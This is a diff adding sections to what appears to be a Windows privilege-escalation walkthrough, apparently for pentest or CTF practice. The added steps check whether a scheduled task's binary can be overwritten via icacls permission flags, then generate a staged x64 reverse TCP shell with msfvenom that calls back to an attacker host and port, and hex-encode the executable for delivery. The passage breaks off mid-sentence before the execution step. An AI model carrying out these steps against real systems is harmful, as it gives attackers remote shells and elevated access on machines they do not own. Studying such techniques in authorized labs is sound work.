@@ -68,3 +68,60 @@ cmd
 schtasks /query /fo LIST /v | findstr /i "TaskName\|Task To Run\|Run As User\|Next Run"
 ```
 
+### 2.4 Check Binary Permissions
+
+cmd
+
+```cmd
+-- Check if you can overwrite the task binary
+icacls "C:\path\to\task\binary.exe"
+```
+
+**Permission flags that allow exploitation:**
+
+|Flag|Meaning|
+|---|---|
+|`(F)`|Full Control ✅|
+|`(W)`|Write ✅|
+|`(M)`|Modify ✅|
+|`(RX)`|Read+Execute ❌|
+## Phase 3 — Prepare Reverse Shell
+
+### 3.1 Generate Payload on Kali
+
+bash
+
+```bash
+# Staged payload (smallest ~7KB — recommended)
+msfvenom -p windows/x64/shell/reverse_tcp \
+    LHOST=yourip \
+    LPORT=4444 \
+    -f exe -o shell.exe
+
+# Check size
+ls -lh shell.exe
+
+# Verify architecture matches target
+file shell.exe
+```
+
+> ⚠️ **Architecture must match target**
+> 
+> - Run `echo %PROCESSOR_ARCHITECTURE%` on target first
+> - AMD64 → use `windows/x64`
+> - x86 → use `windows/x86`
+
+### 3.2 Convert to Hex
+
+bash
+
+```bash
+# Convert exe to hex string
+xxd -p shell.exe | tr -d '\n' > shell.hex
+
+# Verify it starts with MZ header (4d5a)
+head -c 8 shell.hex
+# should show: 4d5a9000 ✅
+```
+
+now we will execute the 
